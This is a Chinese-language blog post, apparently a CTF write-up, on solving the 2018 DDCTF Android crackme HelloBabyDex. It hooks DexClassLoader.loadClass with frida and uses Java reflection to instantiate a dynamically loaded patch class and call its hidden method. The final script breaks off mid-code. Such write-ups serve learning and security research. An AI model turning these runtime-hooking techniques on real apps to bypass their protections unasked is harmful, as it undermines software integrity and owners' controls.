<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="Po1lux&#39;s Diary">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="Po1lux&#39;s Diary">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Po1lux&#39;s Diary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/3/">






  <title>Po1lux's Diary</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Po1lux's Diary</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/08/使用frida-Hook动态加载Dex/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Po1lux">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/IMG.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Po1lux's Diary">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/11/08/使用frida-Hook动态加载Dex/" itemprop="url">使用frida Hook动态加载Dex</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-08T15:06:05+08:00">
                2019-11-08
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/11/08/使用frida-Hook动态加载Dex/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/11/08/使用frida-Hook动态加载Dex/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2019/11/08/使用frida-Hook动态加载Dex/" class="leancloud_visitors" data-flag-title="使用frida Hook动态加载Dex">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>&#x590D;&#x73B0;&#x4E86;2018DDCTF &#x7684;&#x4E00;&#x9053;&#x5B89;&#x5353;&#x9898;HelloBabyDex&#xFF0C;&#x53C2;&#x8003;&#x4E86;&#x7F51;&#x4E0A;&#x7684;&#x5F88;&#x591A;&#x8D44;&#x6599;&#xFF0C;&#x5B66;&#x5230;&#x4E86;&#x5F88;&#x591A;&#x77E5;&#x8BC6;&#xFF0C;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x4F7F;&#x7528;frida Hook&#x52A8;&#x6001;&#x52A0;&#x8F7D;Dex&#x53BB;&#x89E3;&#x8FD9;&#x9053;&#x9898;&#x8FC7;&#x7A0B;&#x4E2D;&#x5B66;&#x5230;&#x7684;&#x4E1C;&#x897F;&#xFF0C;&#x671F;&#x95F4;&#x8FD8;&#x8865;&#x5145;&#x4E86;Java&#x5173;&#x4E8E;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x7684;&#x77E5;&#x8BC6;&#x2026;..</p>
<h3 id="POINT"><a href="#POINT" class="headerlink" title="POINT"></a>POINT</h3><ol>
<li>Hook&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x7684;Dex&#x7684;&#x7C7B;&#x65B9;&#x6CD5;</li>
<li>Hook&#x91CD;&#x8F7D;&#x7684;&#x65B9;&#x6CD5;</li>
<li>&#x4F7F;&#x7528;Java.cast&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x8F6C;&#x6362;</li>
<li>&#x4F7F;&#x7528;Java.array&#x521B;&#x5EFA;&#x6570;&#x7EC4;</li>
<li>java&#x53CD;&#x5C04;&#x673A;&#x5236;&#x4E2D;&#x7684;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;</li>
</ol>
<h3 id="PROLOGUE"><a href="#PROLOGUE" class="headerlink" title="PROLOGUE"></a>PROLOGUE</h3><p>&#x8FD9;&#x4E2A;app&#x4F7F;&#x7528;&#x4E86;&#x7F8E;&#x56E2;&#x7684;rubust&#x70ED;&#x4FEE;&#x6539;&#x6846;&#x67B6;&#xFF0C;&#x6846;&#x67B6;&#x901A;&#x8FC7;DexClassLoader&#x65B9;&#x6CD5;&#x53BB;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x53BB;&#x8C03;&#x7528;&#x7C7B;&#x65B9;&#x6CD5;&#x6216;&#x6210;&#x5458;&#x53D8;&#x91CF;&#xFF0C;&#x800C;DexClassLoader&#x65B9;&#x6CD5;&#x771F;&#x6B63;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x5176;&#x7236;&#x7C7B;&#x7684;&#x7236;&#x7C7B;&#x4E2D;&#x7684;loadClass&#x65B9;&#x6CD5;&#xFF0C;&#x90A3;&#x5C31;&#x53EF;&#x4EE5;&#x53BB;Hook DexClassLoader&#x8FD9;&#x4E2A;&#x7C7B;&#x4E0B;&#x7684;loadClass&#x65B9;&#x6CD5;&#x3002;</p>
<h2 id="0&#x3001;&#x4F7F;&#x7528;frida&#x6CE8;&#x5165;&#x5230;Zygote&#x751F;&#x6210;&#x8C03;&#x8BD5;app"><a href="#0&#x3001;&#x4F7F;&#x7528;frida&#x6CE8;&#x5165;&#x5230;Zygote&#x751F;&#x6210;&#x8C03;&#x8BD5;app" class="headerlink" title="0&#x3001;&#x4F7F;&#x7528;frida&#x6CE8;&#x5165;&#x5230;Zygote&#x751F;&#x6210;&#x8C03;&#x8BD5;app"></a>0&#x3001;&#x4F7F;&#x7528;frida&#x6CE8;&#x5165;&#x5230;Zygote&#x751F;&#x6210;&#x8C03;&#x8BD5;app</h2><p>&#x901A;&#x8FC7;&#x5206;&#x6790;&#x9898;&#x76EE;&#xFF0C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x7A0B;&#x5E8F;&#x5728;onCreate&#x65F6;&#x53BB;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x4E86;dex&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;app&#x5728;&#x542F;&#x52A8;&#x65F6;&#x52A0;&#x8F7D;&#x7684;dex&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x5728;&#x542F;&#x52A8;&#x524D;&#x5C06;frida&#x6CE8;&#x5165;&#x5230;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x3002;frida&#x53EF;&#x4EE5;&#x901A;&#x8FC7;-f&#x53C2;&#x6570;&#x5B9E;&#x73B0;&#xFF1A;</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f cn.chaitin.geektan.crackme</span><br></pre></td></tr></table></figure>
<p>&#x542F;&#x52A8;python&#x811A;&#x672C;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;%resume&#x542F;&#x52A8;app</p>
<h2 id="1&#x3001;&#x3001;Hook&#x91CD;&#x8F7D;&#x7684;&#x65B9;&#x6CD5;loadClass"><a href="#1&#x3001;&#x3001;Hook&#x91CD;&#x8F7D;&#x7684;&#x65B9;&#x6CD5;loadClass" class="headerlink" title="1&#x3001;&#x3001;Hook&#x91CD;&#x8F7D;&#x7684;&#x65B9;&#x6CD5;loadClass"></a>1&#x3001;&#x3001;Hook&#x91CD;&#x8F7D;&#x7684;&#x65B9;&#x6CD5;loadClass</h2><p>&#x4F46;&#x662F;loadClass&#x6709;2&#x4E2A;&#x91CD;&#x8F7D;&#x65B9;&#x6CD5;&#xFF0C;&#x5728;frida&#x4E2D;&#x4F7F;&#x7528;overload&#x6307;&#x5B9A;Hook&#x7684;&#x91CD;&#x8F7D;&#x65B9;&#x6CD5;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException {</span><br><span class="line">        <span class="keyword">return</span> loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">    }</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    {</span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) {</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="keyword">null</span>) {</span><br><span class="line">                        c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                    } <span class="keyword">else</span> {</span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    }</span><br><span class="line">                } <span class="keyword">catch</span> (ClassNotFoundException e) {</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="keyword">null</span>) {</span><br><span class="line">                    c = findClass(name);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
<p>Hook&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;String&#x7C7B;&#x578B;&#x7684;&#x65B9;&#x6CD5;&#xFF1A;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dexclassLoader = Java.use(<span class="string">&quot;dalvik.system.DexClassLoader&quot;</span>);</span><br><span class="line">dexclassLoader.loadClass.overload(<span class="string">&apos;java.lang.String&apos;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span></span><br></pre></td></tr></table></figure>
<h2 id="2&#x3001;&#x5C06;loadClass&#x5F97;&#x5230;&#x7C7B;&#x5BF9;&#x8C61;&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x8F6C;&#x6362;"><a href="#2&#x3001;&#x5C06;loadClass&#x5F97;&#x5230;&#x7C7B;&#x5BF9;&#x8C61;&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x8F6C;&#x6362;" class="headerlink" title="2&#x3001;&#x5C06;loadClass&#x5F97;&#x5230;&#x7C7B;&#x5BF9;&#x8C61;&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x8F6C;&#x6362;"></a>2&#x3001;&#x5C06;loadClass&#x5F97;&#x5230;&#x7C7B;&#x5BF9;&#x8C61;&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x8F6C;&#x6362;</h2><p>&#x8FD9;&#x4E2A;name&#x5C31;&#x662F;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x7684;&#x7C7B;&#x540D;&#xFF0C;&#x5373; <code>cn.chaitin.geektan.crackme.MainActivityPatch</code>&#xFF0C;&#x5F53;name&#x5339;&#x914D;&#x6210;&#x529F;&#x65F6;&#xFF0C;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7C7B;&#x5BF9;&#x8C61;<code>class cn.chaitin.geektan.crackme.MainActivityPatch</code>&#xFF0C;&#x6309;&#x7406;&#x8BF4;&#x5229;&#x7528;&#x53CD;&#x5C04;&#x673A;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x7C7B;&#x5BF9;&#x8C61;&#x53BB;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F;&#x5C1D;&#x8BD5;&#x540E;&#x4E0D;&#x884C;&#xFF0C;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x8F6C;&#x6362;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hookclass = <span class="keyword">this</span>.loadClass(name,<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">var</span> ClassUse = Java.use(<span class="string">&quot;java.lang.Class&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> hookClassCast = Java.cast(hookClass,ClassUse);</span><br></pre></td></tr></table></figure>
<p>&#x8FD9;&#x6837;&#x5C31;&#x83B7;&#x5F97;&#x4E86;&#x4E00;&#x4E2A;&#x6307;&#x5411;MainActivityPatch&#x7684;&#x7C7B;&#x5BF9;&#x8C61;</p>
<h2 id="3&#x3001;&#x83B7;&#x5F97;&#x7C7B;Constructor&#x5E76;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;"><a href="#3&#x3001;&#x83B7;&#x5F97;&#x7C7B;Constructor&#x5E76;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;" class="headerlink" title="3&#x3001;&#x83B7;&#x5F97;&#x7C7B;Constructor&#x5E76;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;"></a>3&#x3001;&#x83B7;&#x5F97;&#x7C7B;Constructor&#x5E76;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;</h2><p>&#x6709;&#x4E86;&#x7C7B;&#x5BF9;&#x8C61;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7C7B;&#x5BF9;&#x8C61;&#x7684; <code>getDeclaredConstructor(Class&lt;?&gt;...ParametersType)</code>&#x65B9;&#x6CD5;&#x83B7;&#x5F97;&#x6307;&#x5B9A;&#x53C2;&#x6570;&#x7684;&#x6784;&#x9020;&#x5668;&#xFF0C;&#x5373;&#x6784;&#x9020;&#x51FD;&#x6570;&#x5BF9;&#x8C61;&#x3002;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x662F;&#x7C7B;&#x578B;&#x4E3A;&#x7C7B;&#x5BF9;&#x8C61;&#x7684;&#x6570;&#x7EC4;&#x3002;&#x67E5;&#x770B;&#x52A8;&#x6001;&#x52A0;&#x8F7D;&#x7C7B;&#x4E2D;<code>MainActivityPatch</code>&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x53C2;&#x6570;&#x662F;Object&#x7C7B;&#x578B;&#x3002;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MainActivityPatch</span><span class="params">(Object obj)</span> </span>{</span><br><span class="line">    <span class="keyword">this</span>.originClass = (MainActivity) obj;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x901A;&#x8FC7;frida&#x7684;Java.array&#x65B9;&#x6CD5;&#x53BB;&#x6784;&#x9020;Object&#x7C7B;&#x578B;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x8BED;&#x6CD5;&#x662F;</p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java.array(<span class="string">&apos;type&apos;</span>,[<span class="keyword">value</span><span class="number">1</span>,<span class="keyword">value</span><span class="number">2</span>,....]);</span><br></pre></td></tr></table></figure>
<p><strong>&#x6784;&#x9020;&#x53C2;&#x6570;</strong>&#xFF0C;&#x8FD9;&#x4E2A;type&#x7684;&#x5199;&#x6CD5;&#x548C;smali&#x8BED;&#x6CD5;&#x4E00;&#x6837;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> objectclass= Java.use(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> ConstructorParam =Java.array(<span class="string">&apos;Ljava.lang.Object;&apos;</span>,[objectclass.class]);</span><br></pre></td></tr></table></figure>
<p><strong>&#x7136;&#x540E;&#x8C03;&#x7528;getDeclaredConstructor&#x65B9;&#x6CD5;&#x83B7;&#x5F97;&#x7C7B;&#x6784;&#x9020;&#x5668;</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br></pre></td></tr></table></figure>
<p>&#x8FD9;&#x6837;&#x901A;&#x8FC7;&#x6307;&#x5B9A;&#x6784;&#x9020;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x8FD4;&#x56DE;&#x4E86;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#x5BF9;&#x8C61;&#xFF0C;<code>Constructor</code>&#x5BF9;&#x8C61;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;<code>newInstance(Object ... initargs)</code>&#xFF0C;&#x8FD9;&#x91CC;&#x7684;<code>initargs</code>&#x5373;&#x4E3A;&#x8981;&#x4F20;&#x7ED9;&#x6784;&#x9020;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x3002;&#x4F7F;&#x7528;<code>newInstance</code>&#x5C31;&#x83B7;&#x53D6;&#x4E86;<code>MainActivityPatch</code>&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> orininclass = Java.use(<span class="string">&quot;cn.chaitin.geektan.crackme.MainActivity&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> mainAc = orininclass.$<span class="keyword">new</span>();</span><br><span class="line"><span class="keyword">var</span> instance = Constructor.newInstance([mainAc]);</span><br></pre></td></tr></table></figure>
<h2 id="4&#x3001;&#x8C03;&#x7528;&#x5BF9;&#x8C61;&#x65B9;&#x6CD5;"><a href="#4&#x3001;&#x8C03;&#x7528;&#x5BF9;&#x8C61;&#x65B9;&#x6CD5;" class="headerlink" title="4&#x3001;&#x8C03;&#x7528;&#x5BF9;&#x8C61;&#x65B9;&#x6CD5;"></a>4&#x3001;&#x8C03;&#x7528;&#x5BF9;&#x8C61;&#x65B9;&#x6CD5;</h2><p>&#x5F97;&#x5230;&#x5B9E;&#x4F8B;&#x5316;&#x7684;&#x5BF9;&#x8C61;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;getDeclaredMethods&#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x8FD9;&#x4E2A;&#x7C7B;&#x7684;&#x7C7B;&#x65B9;&#x6CD5;&#xFF0C;&#x67E5;&#x770B;getDeclaredMethods&#x7684;&#x539F;&#x578B;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Method[] getDeclaredMethods()</span><br></pre></td></tr></table></figure>
<p>&#x901A;&#x8FC7;&#x539F;&#x578B;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x8BE5;&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x7684;&#x662F;Method&#x6570;&#x7EC4;&#xFF0C;Joseph&#x51FD;&#x6570;&#x5728;&#x6570;&#x7EC4;&#x4E2D;&#x7B2C;&#x4E00;&#x4E2A;&#x3002;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func = hookClassCast.getDeclaredMethods();</span><br><span class="line"><span class="keyword">var</span> f = func[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
<p>&#x77E5;&#x9053;&#x76EE;&#x6807;&#x51FD;&#x6570;&#x7684;&#x4F4D;&#x7F6E;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;Method.invoke&#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x8BE5;&#x65B9;&#x6CD5;&#xFF0C;&#x770B;&#x4E0B;invoke&#x65B9;&#x6CD5;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x7684;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x5E26;&#x5165;&#x7684;&#x5B9E;&#x9645;&#x503C;&#x6570;&#x7EC4;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br></pre></td></tr></table></figure>
<p>&#x6240;&#x4EE5;&#x6267;&#x884C;Joseph(5&#xFF0C;6)&#x7684;js&#x8BED;&#x53E5;&#x662F;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Integerclass = Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> num1 = Integerclass.$<span class="keyword">new</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">var</span> num2 = Integerclass.$<span class="keyword">new</span>(<span class="number">6</span>);</span><br><span class="line"><span class="keyword">var</span> numArr1 = Java.array(<span class="string">&apos;Ljava.lang.Object;&apos;</span>,[num1,num2]);</span><br><span class="line"><span class="keyword">var</span> rtn1 = f.invoke(instance,numArr1);</span><br></pre></td></tr></table></figure>
<p>&#x6700;&#x7EC8;&#x7684;EXP&#x5982;&#x4E0B;&#xFF08;&#x53C2;&#x8003;&#x770B;&#x96EA;&#x8BBA;&#x575B;<a href="https://bbs.pediy.com/user-811277.htm" target="_blank" rel="noopener">ghostmazeW</a>&#xFF09;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">var</span> hookClass = <span class="literal">undefined</span>;</span><br><span class="line">        <span class="keyword">var</span> ClassUse = Java.use(<span class="string">&quot;java.lang.Class&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> objectclass= Java.use(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> dexclassLoader = Java.use(<span class="string">&quot;dalvik.system.DexClassLoader&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> orininclass = Java.use(<span class="string">&quot;cn.chaitin.geektan.crackme.MainActivity&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> Integerclass = Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> mainAc = orininclass.$<span class="keyword">new</span>();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(<span class="string">&apos;java.lang.String&apos;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>{</span><br><span class="line">            <span class="keyword">var</span> hookname = <span class="string">&quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">this</span>.loadClass(name,<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span>(name == hookname){</span><br><span class="line">                <span class="keyword">var</span> hookClass = result;</span><br><span class="line">                <span class="keyword">var</span> hookClassCast = Java.cast(hookClass,ClassUse);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;-----------------------------GET Constructor-------------------------------------&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> 